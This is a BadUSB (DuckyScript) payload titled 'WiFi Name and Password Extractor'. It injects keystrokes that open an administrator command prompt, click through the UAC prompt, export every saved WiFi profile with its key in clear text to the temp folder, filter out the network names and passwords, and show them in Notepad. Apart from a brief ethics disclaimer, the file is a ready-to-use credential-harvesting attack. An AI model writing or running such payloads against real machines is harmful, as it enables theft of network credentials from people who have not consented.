REM BadUSB Script: WiFi Name and Password Extractor
REM Description: This script extracts WiFi names and passwords from a Windows machine and displays them in a text file.
REM Note: Use responsibly and ethically. Unauthorized access to systems is illegal.
REM Author: Chris Garey
REM Date: 06/26/2024

REM Opens a command prompt as admin
DELAY 500
GUI r
DELAY 500
STRING cmd
DELAY 500
CTRL-SHIFT ENTER
DELAY 1000
ALT y
DELAY 500

REM Grab local WiFi Credentials
STRING netsh wlan export profile key=clear folder=%TEMP%
ENTER

REM Outputs results to a .xml file
DELAY 2000
STRING type %TEMP%\*.xml > %TEMP%\WiFiPasswords.xml
ENTER

REM Extract WiFi names and passwords
DELAY 2000
STRING findstr /c:"<name>" %TEMP%\WiFiPasswords.xml > %TEMP%\WiFiProfilesFiltered.txt
ENTER
DELAY 500
STRING findstr keyMaterial %TEMP%\WiFiPasswords.xml >> %TEMP%\WiFiProfilesFiltered.txt
REM Displays results in a new Notepad instance
ENTER
DELAY 2000
STRING notepad %TEMP%\WiFiProfilesFiltered.txt
ENTER

REM Exit command prompt
DELAY 500
STRING exit
